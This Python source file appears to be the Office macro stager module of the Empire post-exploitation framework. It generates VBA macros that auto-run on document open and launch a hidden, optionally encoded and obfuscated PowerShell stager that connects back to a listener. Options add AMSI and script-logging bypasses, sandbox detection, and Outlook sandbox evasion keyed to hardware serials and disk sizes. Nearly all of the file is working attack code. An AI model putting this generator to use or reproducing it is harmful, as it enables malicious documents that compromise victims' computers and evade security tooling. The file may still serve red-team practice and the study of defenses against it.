from __future__ import print_function
from builtins import str
from builtins import range
from builtins import object
from lib.common import helpers
import random, string

class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Macro',

            'Author': ['@enigma0x3', '@harmj0y'],

            'Description': ('Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.'),

            'Comments': [
                'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output launcher to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },       
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ScriptLogBypass' : {
                'Description'   :   'Include cobbr\'s Script Block Log Bypass in the stager code.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'AMSIBypass' : {
                'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'AMSIBypass2' : {
                'Description'   :   'Include Tal Liberman\'s AMSI Bypass in the stager code.',
                'Required'      :   False,
                'Value'         :   'False'
            },
	    'OutlookEvasion' : {
                'Description'   :   'Include BC-Securty\'s Outlook Sandbox evasion code',
                'Required'      :   False,
                'Value'         :   'False'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        scriptLogBypass = self.options['ScriptLogBypass']['Value']
        AMSIBypass = self.options['AMSIBypass']['Value']
        AMSIBypass2 = self.options['AMSIBypass2']['Value']
        OutlookEvasion = self.options['OutlookEvasion']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        invokeObfuscation = False
        if obfuscate.lower() == "true":
            invokeObfuscation = True

        scriptLogBypassBool = False
        if scriptLogBypass.lower() == "true":
            scriptLogBypassBool = True

        AMSIBypassBool = False
        if AMSIBypass.lower() == "true":
            AMSIBypassBool = True

        AMSIBypass2Bool = False
        if AMSIBypass2.lower() == "true":
            AMSIBypass2Bool = True
    
        OutlookEvasionBool = False
        if OutlookEvasion.lower() == "true":
            OutlookEvasionBool = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
        Str = ''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
        Method=''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            chunks = list(helpers.chunks(launcher, 50))
            payload = "\tDim "+Str+" As String\n"
            payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
            for chunk in chunks[1:]:
                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"

            macro = "Sub Auto_Open()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"
            macro += "Sub AutoOpen()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"

            macro += "Sub Document_Open()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"

            macro += "Public Function "+Method+"() As Variant\n"
            macro += "\tstrComputer = \".\"\n"
            macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n"
            if OutlookEvasionBool == True:
                macro += "\tSet ID = objWMIService.ExecQuery(\"Select IdentifyingNumber from Win32_ComputerSystemproduct\")\n"
                macro += "\tFor Each objItem In ID\n"
                macro += "\t\tIf StrComp(objItem.IdentifyingNumber, \"2UA20511KN\") = 0 Then End\n"
                macro += "\tNext\n"    
                macro += "\tSet disksize = objWMIService.ExecQuery(\"Select Size from Win32_logicaldisk\")\n"
                macro += "\tFor Each objItem In disksize\n"
                macro += "\t\tIf (objItem.Size = 42949603328#) Then End\n"
                macro += "\t\tIf (objItem.Size = 68719443968#) Then End\n"
                macro +="\tNext\n"
                 
            macro += payload
            macro += "\tConst HIDDEN_WINDOW = 0\n"
            
            macro += "\tSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n"
            macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
            macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
            macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
            macro += "\tobjProcess.Create "+Str+", Null, objConfig, intProcessID\n"
            macro += "End Function\n"

            return macro
